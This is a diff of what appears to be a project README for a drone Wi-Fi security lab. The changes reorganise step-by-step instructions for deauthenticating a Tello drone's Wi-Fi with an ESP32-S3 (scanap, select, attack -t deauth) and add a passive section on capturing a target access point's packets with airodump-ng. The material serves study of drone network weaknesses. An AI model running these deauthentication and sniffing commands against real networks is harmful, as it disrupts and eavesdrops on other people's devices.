@@ -149,44 +149,7 @@ python3 tello_testing.py
 
 ---
 
-## 5. Using the ESP32-S3 to Deauthenticate the Tello's Wi-Fi connection
-
-1. Connect your ESP32-S3 to the serial terminal.
-    (Optional) - Run 'help' to see a list of commands
-
-2. Scan the available Access Points
-```
-scanap
-```
-Note: Use 'stopscan' to stop any currently running WiFi/Bluetooth scan/attack.
-
-3. Identify the index of the drone and add it to the list.
-
-```
-select -a <index>
-```
-
-4. Confirm the correct index was selected
-
-```
-list -a
-```
-
-5. Deauthenticate the APs in the list (only intended for educational purposes)
-
-```
-attack -t deauth
-```
-
-6. Stop the attack
-
-```
-stopscan
-```
-
----
-
-## 6. Setting up the Attacker VM
+## 5. Setting up the Attacker VM
 
 ### Kali Linux Setup
 
@@ -252,8 +215,78 @@ iw dev                       # confirm monitor device (e.g. wlan0mon)
              
 ```
 ---
-## 7. Configure the Raspberry Pi Pico
+---
+## 6. Configure the Raspberry Pi Pico
 
+
+
+
+---
+## Passive attacks
+
+--
+### 1. Sniffing and Packet Capture
+
+_This section assumes your USB Wi-Fi adapter is in monitor mode._
+
+1. Discover networks
+```
+airodump-ng <network-interface>
+```
+- Replace <network-interface> with your wireless adapter (i.e. wlan0mon)
+
+2. Capture packets on the specified APs 
+```
+airodump-ng --bssid <target-AP-BSSID> -c <channel> -w <file> wlan0mon
+```
+- Writes output to <file>
+
+3. (Optional) Analyze these packets with _analyze_tello_captures.py_
+
+
+---
+
+## Active Attacks
+
+---
+
+### 1. Using the ESP32-S3 to Deauthenticate the Tello's Wi-Fi connection
+
+1. Connect your ESP32-S3 to the serial terminal.
+    (Optional) - Run 'help' to see a list of commands
+
+2. Scan the available Access Points
+```
+scanap
+```
+Note: Use 'stopscan' to stop any currently running WiFi/Bluetooth scan/attack.
+
+3. Identify the index of the drone and add it to the list.
+
+```
+select -a <index>
+```
+
+4. Confirm the correct index was selected
+
+```
+list -a
+```
+
+5. Deauthenticate the APs in the list (only intended for educational purposes)
+
+```
+attack -t deauth
+```
+
+6. Stop the attack
+
+```
+stopscan
+```
+--
+
+### 2. 
 
 
 
